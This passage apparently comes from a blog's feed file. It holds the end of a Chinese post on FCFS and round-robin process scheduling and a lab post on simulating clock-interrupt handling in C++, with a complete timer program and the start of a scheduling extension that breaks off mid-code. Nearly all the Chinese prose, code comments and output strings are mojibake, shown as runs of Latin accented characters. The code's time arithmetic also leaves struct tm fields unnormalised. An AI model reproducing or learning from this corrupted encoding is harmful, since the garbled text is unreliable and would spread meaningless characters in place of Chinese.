ï¼Œæ¥å®Œæˆè¿›ç¨‹çš„é˜»å¡ï¼Œè¢«é˜»å¡è¿›ç¨‹å†æ¬¡åŠ å…¥é˜»å¡é˜Ÿåˆ—ã€‚</p><p>è€Œä¹‹åæˆ‘åˆæ ¹æ®è¿™ä¸€ç‰ˆçš„RRè°ƒåº¦ç®—æ³•æ›´æ”¹äº†FCFSçš„ä»£ç ï¼Œåªéœ€è¦å»æ‰RRè½®è½¬éƒ¨åˆ†çš„ä»£ç å°±å¯ä»¥å˜æˆFCFSäº†ï¼Œè¿™ä¸RRç®—æ³•åœ¨æ—¶é—´ç‰‡æ— é™é•¿æ—¶ç­‰ä»·äºFCFSç®—æ³•çš„è§„å¾‹ä¹Ÿæ˜¯ç›¸åŒçš„ï¼ˆå…³äºè¿™ä¸ªç»“æœä¸Šæ–¹çš„è¿è¡Œç»“æœä¸­ä¹Ÿæœ‰æ¯”è¾ƒï¼‰ï¼Œè™½ç„¶FCFSä»£ç æ¯”ç¬¬ä¸€ç‰ˆå¤æ‚äº†å¾ˆå¤šï¼Œä½†ç»“æ„å’Œé€»è¾‘ä¸Šæ›´ä¸ºå®Œå–„äº†ã€‚</p><p>ä»è¿™ä¸¤ä¸ªå®éªŒï¼Œè®©æˆ‘æ›´åŠ ç†è§£äº†FCFSå’Œè½®è½¬æ³•è°ƒåº¦çš„è§„åˆ™ï¼Œå¯¹äºè¿›ç¨‹åœ¨è°ƒåº¦æ—¶å°±ç»ªé˜Ÿåˆ—é˜»å¡é˜Ÿåˆ—ç­‰çš„å˜åŒ–ä¹Ÿæœ‰äº†æ›´æ·±åˆ»çš„ç†è§£ã€‚åœ¨å®éªŒç¼–å†™è¿‡ç¨‹ä¸­ï¼Œä¹Ÿé‡åˆ°è®¸å¤šé”™è¯¯ï¼Œä½†åæ¥æ€»ç»“èµ·æ¥çœ‹ï¼Œå¾ˆå¤šéƒ½æ˜¯æ²¡æœ‰å¼„æ¸…æ¥šè¿›ç¨‹å…¥é˜Ÿå‡ºé˜Ÿçš„å…³ç³»å¯¼è‡´çš„ï¼Œç†æ¸…æ¥šå°±ç»ªå’Œè¿è¡Œé˜Ÿåˆ—çš„å…·ä½“å…³ç³»åï¼ŒæŒ‰æ¬¡åºå°†è¿›ç¨‹åŠ å…¥é˜Ÿåˆ—ï¼Œå†æ‰§è¡Œï¼Œé€ä¸ªåˆ¤æ–­è¿›ç¨‹ç»“æŸçš„æ¡ä»¶ï¼Œå¼„æ¸…æ¥šè¿™äº›ï¼Œä»£ç ä¹Ÿå°±é¡ºåˆ©å®Œæˆäº†ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œè¿™æ¬¡å®éªŒæ”¶è·ä¹Ÿå¾ˆå¤§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒä¸‰-ä¸­æ–­å¤„ç†</title>
    <link href="/posts/8a95bb2a/"/>
    <url>/posts/8a95bb2a/</url>
    
    <content type="html"><![CDATA[<h1 id="æ“ä½œç³»ç»Ÿç¬¬ä¸‰æ¬¡å®éªŒä¸­æ–­å¤„ç†"><a class="markdownIt-Anchor" href="#æ“ä½œç³»ç»Ÿç¬¬ä¸‰æ¬¡å®éªŒä¸­æ–­å¤„ç†"></a> æ“ä½œç³»ç»Ÿç¬¬ä¸‰æ¬¡å®éªŒä¸­æ–­å¤„ç†</h1><h1 id="ä¸­æ–­å¤„ç†"><a class="markdownIt-Anchor" href="#ä¸­æ–­å¤„ç†"></a> ä¸­æ–­å¤„ç†</h1><h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>è¿ç”¨æŸç§é«˜çº§è¯­è¨€ï¼ˆå¦‚Cæˆ–C++ï¼‰æ¨¡æ‹Ÿæ—¶é’Ÿä¸­æ–­çš„äº§ç”ŸåŠè®¾è®¡ä¸€ä¸ªå¯¹æ—¶é’Ÿä¸­æ–­äº‹ä»¶è¿›è¡Œå¤„ç†çš„æ¨¡æ‹Ÿç¨‹åºã€‚</li></ul><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>ç°ä»£è®¡ç®—æœºç³»ç»Ÿçš„ç¡¬ä»¶éƒ¨åˆ†éƒ½è®¾æœ‰ä¸­æ–­æœºæ„ï¼Œä¸­æ–­æœºæ„èƒ½å‘ç°ä¸­æ–­äº‹ä»¶ï¼Œä¸”å½“å‘ç°ä¸­æ–­äº‹ä»¶åè¿«ä½¿æ­£åœ¨å¤„ç†å™¨ä¸Šæ‰§è¡Œçš„è¿›ç¨‹æš‚æ—¶åœæ­¢æ‰§è¡Œï¼Œè€Œè®©æ“ä½œç³»ç»Ÿçš„ä¸­æ–­å¤„ç†ç¨‹åºå æœ‰å¤„ç†å™¨å»å¤„ç†å‡ºç°çš„ä¸­æ–­äº‹ä»¶ã€‚</li><li>æœ¬å®éªŒæ¨¡æ‹Ÿâ€œæ—¶é’Ÿä¸­æ–­äº‹ä»¶â€çš„å¤„ç†ï¼Œå¯¹å…¶å®ƒä¸­æ–­äº‹ä»¶çš„æ¨¡æ‹Ÿå¤„ç†ï¼Œå¯æ ¹æ®å„ä¸­æ–­äº‹ä»¶çš„æ€§è´¨ç¡®å®šå¤„ç†åŸåˆ™ï¼Œåˆ¶å®šç®—æ³•ï¼Œè‡ªè¡Œè®¾è®¡ã€‚</li><li>é€šè¿‡æœ¬å®éªŒäº†è§£ä¸­æ–­åŠä¸­æ–­å¤„ç†ç¨‹åºçš„ä½œç”¨ã€‚</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><ol><li>è®¡ç®—æœºç³»ç»Ÿå·¥ä½œè¿‡ç¨‹ä¸­ï¼Œè‹¥å‡ºç°ä¸­æ–­äº‹ä»¶ï¼Œç¡¬ä»¶å°±æŠŠå®ƒè®°å½•åœ¨ä¸­æ–­å¯„å­˜å™¨ä¸­ã€‚ä¸­æ–­å¯„å­˜å™¨çš„æ¯ä¸€ä½å¯ä¸ä¸€ä¸ªä¸­æ–­äº‹ä»¶å¯¹åº”ï¼Œå½“å‡ºç°æŸä¸­æ–­äº‹ä»¶åï¼Œå¯¹åº”çš„ä¸­æ–­å¯„å­˜å™¨çš„æŸä¸€ä½å°±è¢«ç½®æˆâ€œ1â€ã€‚</li></ol><ul><li>å¤„ç†å™¨æ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼Œå¿…é¡»æŸ¥ä¸­æ–­å¯„å­˜å™¨ï¼Œå½“ä¸­æ–­å¯„å­˜å™¨å†…å®¹ä¸ä¸ºâ€œ0â€æ—¶ï¼Œè¯´æ˜æœ‰ä¸­æ–­äº‹ä»¶å‘ç”Ÿã€‚ç¡¬ä»¶æŠŠä¸­æ–­å¯„å­˜å™¨å†…å®¹ä»¥åŠç°è¡Œç¨‹åºçš„æ–­ç‚¹å­˜åœ¨ä¸»å­˜çš„å›ºå®šå•å…ƒã€‚æ“ä½œç³»ç»Ÿåˆ†æä¿å­˜åœ¨ä¸»å­˜å›ºå®šå•å…ƒä¸­çš„ä¸­æ–­å¯„å­˜å™¨å†…å®¹å°±å¯çŸ¥é“å‡ºç°çš„ä¸­æ–­äº‹ä»¶çš„æ€§è´¨ï¼Œä»è€Œä½œå‡ºç›¸åº”çš„å¤„ç†ã€‚</li><li>æœ¬å®éªŒä¸­ï¼Œç”¨ä»é”®ç›˜è¯»å…¥ä¿¡æ¯æ¥æ¨¡æ‹Ÿä¸­æ–­å¯„å­˜å™¨çš„ä½œç”¨ï¼Œç”¨è®¡æ•°å™¨åŠ 1æ¥æ¨¡æ‹Ÿå¤„ç†å™¨æ‰§è¡Œäº†ä¸€æ¡æŒ‡ä»¤ã€‚æ¯æ¨¡æ‹Ÿä¸€æ¡æŒ‡ä»¤æ‰§è¡Œåï¼Œä»é”®ç›˜è¯»å…¥ä¿¡æ¯ä¸”åˆ†æï¼Œå½“è¯»å…¥ä¿¡æ¯=0æ—¶ï¼Œè¡¨ç¤ºæ— ä¸­æ–­äº‹ä»¶å‘ç”Ÿï¼Œç»§ç»­æ‰§è¡ŒæŒ‡ä»¤ï¼›å½“è¯»å…¥ä¿¡æ¯=1æ—¶ï¼Œè¡¨ç¤ºå‘ç”Ÿäº†æ—¶é’Ÿä¸­æ–­äº‹ä»¶ï¼Œè½¬æ—¶é’Ÿä¸­æ–­å¤„ç†ç¨‹åºã€‚</li></ul><ol start="2"><li>å‡å®šè®¡ç®—æœºç³»ç»Ÿæœ‰ä¸€æ—¶é’Ÿï¼Œå®ƒæŒ‰ç”µæºé¢‘ç‡ï¼ˆ50Hzï¼‰äº§ç”Ÿä¸­æ–­è¯·æ±‚ä¿¡å·ï¼Œå³æ¯éš”20æ¯«ç§’äº§ç”Ÿä¸€æ¬¡ä¸­æ–­è¯·æ±‚ä¿¡å·ï¼Œç§°æ—¶é’Ÿä¸­æ–­ä¿¡å·ï¼Œæ—¶é’Ÿä¸­æ–­çš„é—´éš”æ—¶é—´ï¼ˆ20æ¯«ç§’ï¼‰ç§°æ—¶é’Ÿå•ä½ã€‚</li></ol><ul><li>æŒ‰è‡ªå·±ç¡®å®šçš„é¢‘ç‡åœ¨é”®ç›˜ä¸Šé”®å…¥â€œ0â€æˆ–â€œ1â€æ¥æ¨¡æ‹ŸæŒ‰ç”µæºé¢‘ç‡äº§ç”Ÿçš„æ—¶é’Ÿä¸­æ–­ä¿¡å·ã€‚</li></ul><ol start="3"><li>ä¸­æ–­å¤„ç†ç¨‹åºåº”é¦–å…ˆä¿æŠ¤è¢«ä¸­æ–­çš„ç°è¡Œè¿›ç¨‹çš„ç°åœºï¼ˆé€šç”¨å¯„å­˜å™¨å†…å®¹ã€æ–­ç‚¹ç­‰ï¼‰ï¼Œç°åœºä¿¡æ¯å¯ä¿å­˜åœ¨è¿›ç¨‹æ§åˆ¶å—ä¸­ï¼›ç„¶åå¤„ç†å‡ºç°çš„ä¸­æ–­äº‹ä»¶ï¼Œæ ¹æ®å¤„ç†ç»“æœä¿®æ”¹è¢«ä¸­æ–­è¿›ç¨‹çš„çŠ¶æ€ï¼›æœ€åè½¬å‘å¤„ç†å™¨è°ƒåº¦ï¼Œç”±å¤„ç†å™¨è°ƒåº¦é€‰æ‹©å¯è¿è¡Œçš„è¿›ç¨‹ï¼Œæ¢å¤ç°åœºä½¿å…¶è¿è¡Œã€‚</li></ol><ul><li>æœ¬å®éªŒä¸»è¦æ¨¡æ‹Ÿä¸­æ–­äº‹ä»¶çš„å¤„ç†ï¼Œä¸ºç®€å•èµ·è§å¯çœå»ä¿æŠ¤ç°åœºå’Œå¤„ç†å™¨è°ƒåº¦çš„å·¥ä½œã€‚</li></ul><ol start="4"><li>ä¸ºæ¨¡æ‹Ÿæ—¶é’Ÿä¸­æ–­çš„å¤„ç†ï¼Œå…ˆåˆ†æä¸€ä¸‹æ—¶é’Ÿä¸­æ–­çš„ä½œç”¨ã€‚åˆ©ç”¨æ—¶é’Ÿä¸­æ–­å¯è®¡ç®—æ—¥å†æ—¶é’Ÿï¼Œä¹Ÿå¯ä½œå®šæ—¶é—¹é’Ÿç­‰ã€‚</li></ol><ul><li>è®¡ç®—æ—¥å†æ—¶é’Ÿâ€”â€”æŠŠå¼€æœºæ—¶çš„æ—¶é—´å­˜æ”¾åœ¨æŒ‡å®šçš„ç§°ä¸ºâ€œæ—¥å†æ—¶é’Ÿâ€çš„å·¥ä½œå•å…ƒä¸­ï¼Œç”¨ä¸€è®¡æ—¶å™¨ç´¯è®¡æ—¶é’Ÿä¸­æ–­æ¬¡æ•°ã€‚æ ¹æ®æ—¶é’Ÿä¸­æ–­çš„æ¬¡æ•°å’Œæ—¶é’Ÿå•ä½ï¼ˆ20æ¯«ç§’ï¼‰ä»¥åŠå¼€æœºæ—¶çš„æ—¥å†æ—¶é’Ÿå¯è®¡ç®—å‡ºå½“å‰çš„ç²¾ç¡®çš„æ—¥å†æ—¶é’Ÿã€‚</li><li>å®šæ—¶é—¹é’Ÿâ€”â€”å¯¹éœ€è¦å®šæ—¶çš„åœºåˆï¼Œå¯æŠŠè½®åˆ°è¿è¡Œçš„è¿›ç¨‹çš„æ—¶é—´ç‰‡å€¼é€åˆ°ç§°ä¸ºâ€œå®šæ—¶é—¹é’Ÿâ€çš„å·¥ä½œå•å…ƒä¸­ï¼Œæ¯äº§ç”Ÿä¸€æ¬¡æ—¶é’Ÿä¸­æ–­å°±æŠŠå®šæ—¶é—¹é’Ÿå€¼å‡1ï¼Œå½“è¯¥å€¼ä¸ºâ€œ0â€æ—¶ï¼Œè¡¨ç¤ºç¡®å®šçš„æ—¶é—´å·²åˆ°ï¼Œèµ·åˆ°å®šæ—¶çš„ä½œç”¨ã€‚</li></ul><ol start="5"><li><p>æœ¬å®éªŒçš„æ¨¡æ‹Ÿç¨‹åºå¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯æ¨¡æ‹Ÿç¡¬ä»¶äº§ç”Ÿæ—¶é’Ÿä¸­æ–­ï¼Œå¦ä¸€éƒ¨åˆ†æ¨¡æ‹Ÿæ“ä½œç³»ç»Ÿçš„æ—¶é’Ÿä¸­æ–­å¤„ç†ç¨‹åºã€‚æ¨¡æ‹Ÿç¨‹åºçš„ç®—æ³•å¦‚å›¾1-1ã€‚å…¶ä¸­ï¼Œä¿æŠ¤ç°åœºå’Œå¤„ç†å™¨è°ƒåº¦çš„å·¥ä½œåœ¨ç¼–ç¨‹åºæ—¶å¯çœå»ã€‚çº¦å®šå¤„ç†å™¨è°ƒåº¦æ€»æ˜¯é€‰æ‹©<br>è¢«ä¸­æ–­è¿›ç¨‹ç»§ç»­æ‰§è¡Œã€‚</p></li><li><p>æŒ‰æ¨¡æ‹Ÿç®—æ³•è®¾è®¡ç¨‹åºï¼Œè¦æ±‚æ˜¾ç¤ºæˆ–æ‰“å°å¼€æœºæ—¶é—´ã€å®šæ—¶é—¹é’Ÿåˆå€¼ã€å®šæ—¶é—¹é’Ÿä¸ºâ€œ0â€æ—¶çš„æ—¥å†æ—¶é’Ÿã€‚ç¡®å®šä¸‰ä¸ªä¸åŒçš„å®šæ—¶é—¹é’Ÿåˆå€¼ï¼Œè¿è¡Œè®¾è®¡çš„ç¨‹åºï¼Œè§‚å¯Ÿå¾—åˆ°çš„ç»“æœã€‚</p></li></ol><p><img src="/posts/8a95bb2a/image-20211112104249163.png" alt="image-20211112104249163"></p><p><strong>æ€è€ƒé¢˜</strong></p><p>å°†è¿›ç¨‹è°ƒåº¦ç­–ç•¥ç»“åˆåˆ°æœ¬å®éªŒä¸­ï¼Œå¯é€‰ç”¨æ—¶é—´ç‰‡è½®è½¬çš„è°ƒåº¦ç­–ç•¥ã€‚ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªç›¸åŒçš„æ—¶é—´ç‰‡ï¼Œæ¯äº§ç”Ÿä¸€æ¬¡æ—¶é’Ÿä¸­æ–­ç»å¤„ç†åï¼Œè¢«ä¸­æ–­è¿›ç¨‹æ—¶é—´ç‰‡å‡1ï¼Œæ—¶é—´ç‰‡å€¼Â¹0æ—¶ï¼Œè¯¥è¿›ç¨‹ä¼˜å…ˆè¿è¡Œï¼Œè‹¥æ—¶é—´ç‰‡å€¼=0ä¸”è¯¥è¿›ç¨‹å°šæœªè¿è¡Œç»“æŸï¼Œåˆ™å°†å®ƒæ’å…¥é˜Ÿå°¾ï¼Œå†ç»™å®ƒåˆ†é…ä¸€ä¸ªæ—¶é—´ç‰‡ï¼Œç›´åˆ°æ‰€æœ‰çš„è¿›ç¨‹è¿è¡Œç»“æŸã€‚åº”æ€æ ·è®¾è®¡è¿›ç¨‹æ§åˆ¶å—ï¼Ÿå„è¿›ç¨‹çš„çŠ¶æ€æ€æ ·å˜åŒ–ï¼Ÿåœ¨æœ¬å®éªŒçš„ç¨‹åºä¸­åŠ å…¥å¤„ç†å™¨è°ƒåº¦ç¨‹åº</p><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><h3 id="1-æ—¶é’Ÿä¸­æ–­äº‹ä»¶æ¨¡æ‹Ÿç¨‹åº"><a class="markdownIt-Anchor" href="#1-æ—¶é’Ÿä¸­æ–­äº‹ä»¶æ¨¡æ‹Ÿç¨‹åº"></a> 1. æ—¶é’Ÿä¸­æ–­äº‹ä»¶æ¨¡æ‹Ÿç¨‹åº</h3><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"></a> <strong>æ•°æ®ç»“æ„</strong>å’Œç¬¦å·è¯´æ˜</h4><p>å› ä¸ºè¯¥å®éªŒä¸­æ–­ç»“æŸåç»§ç»­è°ƒç”¨ä¸Šä¸€ä¸ªè¿›ç¨‹ï¼Œç›´åˆ°è¿›ç¨‹ç»“æŸï¼Œæ‰€ä»¥æœªè®¾è®¡è¿›ç¨‹ç»“æ„ä½“ï¼›</p><p>ç¬¦å·è¯´æ˜ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//å­˜å‚¨æ—¥å†æ—¶é—´ç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//ç”¨æ¥ä¿å­˜æ—¶é—´å’Œæ—¥æœŸçš„ç»“æ„</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//è®¡æ—¶å™¨</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//è®¡æ•°å™¨</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//å®šæ—¶æ—¶é’Ÿ</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//ä¸­æ–­å¯„å­˜å™¨</span><br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç "><a class="markdownIt-Anchor" href="#æºä»£ç "></a> æºä»£ç </h4><blockquote><p>è¯¥ç¨‹åºæ€è·¯å¾ˆæ¸…æ™°ï¼Œè®¾ç½®ä¸€ä¸ªå®šæ—¶æ—¶é’Ÿï¼Œç„¶åè¿›è¡Œä¸­æ–­åˆ¤æ–­ï¼Œå½“è¾“å…¥ä¸º1æ—¶ï¼Œä¸­æ–­è¿›ç¨‹ï¼Œå®šæ—¶é—¹é’Ÿå‡ä¸€ï¼Œè¾“å…¥ä¸º0æ—¶ï¼Œç»§ç»­æ‰§è¡Œè¿›ç¨‹ã€‚</p></blockquote><blockquote><p>å½“æ—¶é’Ÿä¸º0æ—¶ï¼Œç¨‹åºç»“æŸï¼Œè®¡ç®—æ—¶é—´åè¾“å‡ºå½“å‰æ—¶é—´ã€‚</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//å­˜å‚¨æ—¥å†æ—¶é—´ç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//ç”¨æ¥ä¿å­˜æ—¶é—´å’Œæ—¥æœŸçš„ç»“æ„</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//è®¡æ—¶å™¨</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//è®¡æ•°å™¨</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//å®šæ—¶æ—¶é’Ÿ</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//ä¸­æ–­å¯„å­˜å™¨</span><br><br><span class="hljs-built_in">time</span>(&amp;t); <span class="hljs-comment">//è·å–ç³»ç»Ÿæ—¶é—´</span><br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<span class="hljs-comment">//å°†timeå€¼åˆ†è§£ä¸ºtmç»“æ„</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;å¼€æœºæ—¶é—´ï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<span class="hljs-comment">//ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºæ—¶é—´</span><br>cout &lt;&lt; <span class="hljs-string">&quot;å®šæ—¶é—¹é’Ÿçš„è®¾å®šå€¼ä¸ºï¼š&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>) <span class="hljs-comment">//å½“æœªåˆ°å®šæ—¶æ—¶é’Ÿè®¾å®šå€¼æ—¶</span><br>&#123;<br><span class="hljs-keyword">if</span> (ir != <span class="hljs-number">0</span>)<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨è¿›è¡Œå¤„ç†å™¨è°ƒåº¦Â·Â·Â·&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ä¸€æ¡æŒ‡ä»¤æ­£åœ¨æ‰§è¡Œ&quot;</span> &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ˜¯å¦æœ‰ä¸­æ–­äº§ç”Ÿï¼Œ1æ˜¯ï¼Œ0å¦ï¼š&quot;</span>; <span class="hljs-comment">//æ¯è¾“å…¥ä¸€æ¬¡é¢‘ç‡è®¾ç½®ä¸º1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ— ä¸­æ–­ï¼ŒæŒ‡ä»¤ç»§ç»­æ‰§è¡Œ&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ­£åœ¨ä¿æŠ¤ç°åœºÂ·Â·Â·&quot;</span> &lt;&lt; endl <span class="hljs-comment">//ä¿æŠ¤ç°åœºå…·ä½“è¿‡ç¨‹çœç•¥</span><br> &lt;&lt; <span class="hljs-string">&quot;ç°åœºä¿æŠ¤å®Œæˆ&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>timer++;   <span class="hljs-comment">//è®¡æ—¶å™¨åŠ 1</span><br>clock_alarm--; <span class="hljs-comment">//å®šæ—¶é—¹é’Ÿå‡1</span><br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;æ—¶é—´è¿‡å»äº†&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;ç°åœ¨æ—¶é—´æ˜¯ï¼š&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>; <span class="hljs-comment">//è®¡ç®—å½“å‰æ—¶é—´</span><br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>å®šæ—¶é—¹é’Ÿclock_alarm=5</p><p><img src="/posts/8a95bb2a/image-20211112110700237.png" alt="image-20211112110700237"></p><p>å®šæ—¶é—¹é’Ÿclock_alarm=3</p><p><img src="/posts/8a95bb2a/image-20211112110831917.png" alt="image-20211112110831917"></p><p>å®šæ—¶é—¹é’Ÿclock_alarm=6</p><p><img src="/posts/8a95bb2a/image-20211112111022197.png" alt="image-20211112111022197"></p><h3 id="2-æ€è€ƒé¢˜æ—¶é’Ÿä¸­æ–­ç¨‹åºåŠ è°ƒåº¦"><a class="markdownIt-Anchor" href="#2-æ€è€ƒé¢˜æ—¶é’Ÿä¸­æ–­ç¨‹åºåŠ è°ƒåº¦"></a> 2. æ€è€ƒé¢˜ï¼šæ—¶é’Ÿä¸­æ–­ç¨‹åºåŠ è°ƒåº¦</h3><h4 id="æ•°æ®ç»“æ„"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„"></a> æ•°æ®ç»“æ„</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //è¿›ç¨‹ç»“æ„ä½“</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//æ—¶é—´ç‰‡</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//è¿›ç¨‹å‰©ä½™è¿è¡Œæ—¶é—´</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//è¿›ç¨‹id</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="ç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#ç¬¦å·è¯´æ˜"></a> ç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">queue&lt;PCB&gt; p; <span class="hljs-comment">//è¿›ç¨‹çš„å°±ç»ªé˜Ÿåˆ—</span><br>PCB process;<span class="hljs-comment">//å½“å‰è¿›ç¨‹</span><br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//å­˜å‚¨æ—¥å†æ—¶é—´ç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//ç”¨æ¥ä¿å­˜æ—¶é—´å’Œæ—¥æœŸçš„ç»“æ„</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜"></a> å‡½æ•°è¯´æ˜</h4><h5 id="æ—¶é—´è®¡ç®—å‡½æ•°"><a class="markdownIt-Anchor" href="#æ—¶é—´è®¡ç®—å‡½æ•°"></a> æ—¶é—´è®¡ç®—å‡½æ•°</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 